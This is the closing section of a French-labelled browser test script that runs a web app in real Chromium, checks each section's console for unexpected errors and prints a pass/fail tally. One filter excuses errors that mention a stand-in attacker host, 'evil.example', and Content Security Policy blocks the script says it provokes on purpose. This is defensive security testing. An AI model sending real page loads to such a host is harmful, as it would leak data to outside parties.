  console.log('  (note) moteur réel de Chromium : ' + (alertTxt ? 'erreur affichée « ' + alertTxt + ' »' : 'aucune erreur affichée') + ' après ' + (Date.now() - t0) + ' ms' + (stopped ? ' (arrêt demandé)' : ''))
  yes(!alertTxt || /Le micro est refusé|n’est pas autorisée|Aucune voix|Aucun micro|injoignable|Le français|inattendue/.test(alertTxt), 'message inattendu : ' + alertTxt)
  eq(N.errors.filter(e => !/favicon|Failed to load resource/.test(e)), [], 'erreurs de console')
})

const badR = [...F.errors, ...G.errors, ...H.errors].filter(e => !/favicon|Failed to load resource/.test(e))
await T('Aucune erreur inattendue dans la console pendant les parcours des rubriques 1, 2 et 4 (accueil guidé, verset, PIN, mur de prières, balayage)', async () => { eq(badR, []) })
await F.ctx.close(); await G.ctx.close(); await H.ctx.close(); await J.ctx.close(); await K.ctx.close(); await N.ctx.close()

const bad13 = [...C.errors, ...D.errors].filter(e => !/favicon|Failed to load resource/.test(e))
await T('Aucune erreur inattendue dans la console pendant les parcours de la rubrique 13 (horloge simulée, grand écran)', async () => { eq(bad13, []) })
const badE = E.errors.filter(e => !/favicon|Failed to load resource/.test(e))
await T('Aucune erreur inattendue dans la console pendant les parcours de la rubrique 5 (partage, bilan, badges)', async () => { eq(badE, []) })

const badB = B.errors.filter(e => !/favicon|Failed to load resource|evil\.example|Content Security Policy|service ?worker/i.test(e))
await T('Aucune erreur inattendue dans la console pendant les parcours de la rubrique 12 (hors blocages CSP provoqués volontairement)', async () => { eq(badB, []) })

const bad = A.errors.filter(e => !/favicon|Failed to load resource/.test(e))
await T('Aucune erreur dans la console du navigateur pendant tous ces parcours', async () => { eq(bad, []) })

await browser.close(); server.kill()
for (const r of rows) console.log(r[0].padEnd(6), r[1])
const ko = rows.filter(r => r[0] !== 'OK').length
console.log('\n' + (rows.length - ko) + '/' + rows.length + ' réussis, ' + ko + ' échec(s) (Chromium réel)')
process.exit(ko ? 1 : 0)
